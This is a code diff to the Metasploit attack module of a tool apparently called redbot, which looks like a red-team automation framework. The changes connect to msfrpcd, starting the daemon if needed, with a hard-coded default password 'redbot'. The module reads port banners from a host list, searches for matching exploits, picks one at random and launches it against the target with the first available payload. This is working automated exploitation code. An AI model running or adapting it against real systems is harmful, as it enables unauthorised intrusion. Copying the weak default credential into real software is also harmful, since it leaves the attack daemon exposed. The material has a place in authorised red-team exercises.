@@ -1,8 +1,9 @@
 import random
+from subprocess import run
+from time import sleep
 from typing import List
 
-from metasploit.msfrpc import MsfRpcClient
-
+from metasploit.msfrpc import MsfRpcClient, MsfRpcError
 from redbot.core.async import celery
 from redbot.core.models import storage
 from redbot.core.utils import random_targets
@@ -16,7 +17,7 @@ class MSF(Attack):
     settings = {
         'password': {
             'name': 'msfrpcd Password',
-            'default': '',
+            'default': 'redbot',
             'description': 'Password to connect to the msfrpcd daemon.'
         },
         'payload': {
@@ -52,24 +53,50 @@ def msf_search(client: MsfRpcClient, query: str) -> List[str]:
     if not cached:
         results = _slow_msf_search(client, query)
         for result in results:
-            storage.sadd('metasploit:' + query, result)
+            storage.sadd('metasploit:' + query, result.decode())
         return results
-    return cached
+    return list(cached)
 
 
 @celery.task
 def msf_attack(host: str, *args, **kwargs):
-    client = MsfRpcClient(MSF.get_setting('password'))
-    host = get_hosts()[host]
+    client = None
+    tries = 0
+    while not client:
+        if tries > 5:
+            MSF.log("Giving up connecting to msfrpcd.", 'danger')
+            return
+        try:
+            client = MsfRpcClient(MSF.get_setting('password'))
+        except ConnectionRefusedError:
+            MSF.log("Can't connect to msfrpcd. Trying to start it...", 'warning')
+            if storage.get('msfrpcd-lock'):
+                sleep(10)
+            else:
+                storage.incr('msfrpcd-lock')
+                run(['msfrpcd', '-P', MSF.get_setting('password')])
+                storage.delete('msfrpcd-lock')
+        except MsfRpcError:
+            MSF.log("Error connecting to msfrpcd. Is the password correct?", 'danger')
+        tries += 1
+
+    target = get_hosts()[host]
     query = ""
     port = None
-    for p in random.sample(host['ports'], len(host['ports'])):
+    for p in random.sample(target['ports'], len(target['ports'])):
         if p.get('banner'):
             query = p['banner'].split()[1]
             port = p['port']
             break
-    exploit = client.modules.use('exploit', random.choice(msf_search(client, query)))
-    exploit['RHOST'.encode()] = host
-    exploit['RPORT'.encode()] = port
+    exploit = random.choice(msf_search(client, query))
+    MSF.log('Using exploit ' + exploit + ' against ' + host)
+    exploit = client.modules.use('exploit', exploit)
+    print(exploit.required)
+    for r in exploit.required:
+        if r == b'RHOST':
+            exploit['RHOST'.encode()] = host
+        elif r == b'RPORT':
+            exploit['RPORT'.encode()] = port
     # TODO: Payloads?
-    print(exploit.execute())
+    e = exploit.execute(payload=exploit.payloads[0].decode())
+    MSF.log('Exploit ' + exploit.modulename + ' against ' + host + ' launched.', 'success')
